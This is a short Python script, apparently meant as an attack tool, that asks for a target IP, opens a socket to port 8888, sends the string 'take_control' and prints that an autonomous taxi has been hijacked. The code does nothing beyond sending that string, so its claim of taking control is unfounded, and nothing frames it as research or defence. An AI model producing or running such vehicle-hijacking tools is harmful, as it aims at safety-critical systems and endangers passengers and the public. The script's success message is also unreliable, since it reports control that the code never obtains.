import socket
import sys

def hijack_autonomous_taxi(target):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, 8888))
        s.send(b"take_control")
        print(f"Hijacked autonomous taxi at {target}")
        s.close()
    except socket.error:
        print("Couldn't connect to server.")
        sys.exit()

def main():
    target = input("Enter target IP: ")
    hijack_autonomous_taxi(target)

if __name__ == "__main__":
    main()
